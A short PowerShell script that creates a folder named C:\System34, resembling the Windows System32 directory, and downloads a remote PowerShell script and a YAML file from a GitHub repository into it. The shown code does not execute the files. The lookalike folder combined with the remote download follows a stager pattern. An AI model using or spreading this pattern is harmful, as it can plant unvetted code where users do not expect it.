$baseFolder = "C:\System34"

New-Item -ItemType Directory -Path $baseFolder -Force | Out-Null

$wc = New-Object System.Net.WebClient

$wc.DownloadFile(
    "https://raw.githubusercontent.com/bas07-hub/Demo/refs/heads/main/Main.ps1",
    "C:\System34\Main.ps1"
)

$wc.DownloadFile(
    "https://raw.githubusercontent.com/bas07-hub/Demo/refs/heads/main/Collection.yaml",
    "C:\System34\Collection.yaml"
)
